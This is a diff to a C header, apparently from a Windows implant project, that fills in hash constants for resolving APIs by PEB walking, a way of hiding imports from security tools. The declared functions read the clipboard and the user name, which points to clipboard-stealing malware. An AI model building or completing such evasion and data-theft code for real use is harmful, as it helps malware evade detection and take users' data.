@@ -6,9 +6,6 @@
 #include <tlhelp32.h>
 #include <stdbool.h>
 
-// macro to store data into the .text section
-#define DOT_TEXT __attribute__((section(".text")))
-
 /* ============================================================================
  * NT Structures for PEB Walking
  * ========================================================================= */
@@ -44,8 +41,8 @@ typedef struct _MY_LDR_DATA_TABLE_ENTRY {
  * ========================================================================= */
 
 #define HASH_KERNEL32_DLL   0x29CDD463U
-#define HASH_USER32_DLL     0x00000000U // À REMPLIR
-#define HASH_ADVAPI32_DLL   0x00000000U // À REMPLIR
+#define HASH_USER32_DLL     0x1a58c439U
+#define HASH_ADVAPI32_DLL   0x35C841F5U
 
 /* ============================================================================
  * Pre-calculated Function Hashes
@@ -66,20 +63,20 @@ typedef struct _MY_LDR_DATA_TABLE_ENTRY {
 #define HASH_FormatMessageA             0x3F75A588U
 #define HASH_GetStdHandle               0xe3b9876aU
 #define HASH_WriteFile                  0x7f07c44aU
-#define HASH_Sleep                      0x00000000U // À REMPLIR
-#define HASH_WaitForSingleObject        0x00000000U // À REMPLIR
-#define HASH_DisableThreadLibraryCalls  0x00000000U // À REMPLIR
+#define HASH_Sleep                      0x2fa62ca8U // À REMPLIR
+#define HASH_WaitForSingleObject        0x71948ca4U // À REMPLIR
+#define HASH_DisableThreadLibraryCalls  0x01c59c83U // À REMPLIR
 
 /* USER32 */
-#define HASH_GetClipboardSequenceNumber 0x00000000U // À REMPLIR
-#define HASH_OpenClipboard              0x00000000U // À REMPLIR
-#define HASH_GetClipboardData           0x00000000U // À REMPLIR
-#define HASH_CloseClipboard             0x00000000U // À REMPLIR
-#define HASH_GlobalLock                 0x00000000U // À REMPLIR
-#define HASH_GlobalUnlock               0x00000000U // À REMPLIR
+#define HASH_GetClipboardSequenceNumber 0xae01ce93U // À REMPLIR
+#define HASH_OpenClipboard              0x8beb9585U // À REMPLIR
+#define HASH_GetClipboardData           0x849d10e7U // À REMPLIR
+#define HASH_CloseClipboard             0xdd5fcc0bU // À REMPLIR
+#define HASH_GlobalLock                 0x2ac84289U // À REMPLIR
+#define HASH_GlobalUnlock               0xbf7687caU // À REMPLIR
 
 /* ADVAPI32 */
-#define HASH_GetUserNameA               0x00000000U // À REMPLIR
+#define HASH_GetUserNameA               0x38a7c61aU // À REMPLIR
 
 /* ============================================================================
  * Hash Functions
@@ -165,7 +162,7 @@ typedef struct _DYNAMIC_APIS {
     fnGetUserNameA               pGetUserNameA;
 } DYNAMIC_APIS, *PDYNAMIC_APIS;
 
-DOT_TEXT extern DYNAMIC_APIS g_Api;
+extern DYNAMIC_APIS g_Api;
 
 DYNAMIC_APIS * InitDynamicAPIs(void);
 DYNAMIC_APIS * getAPI(void);
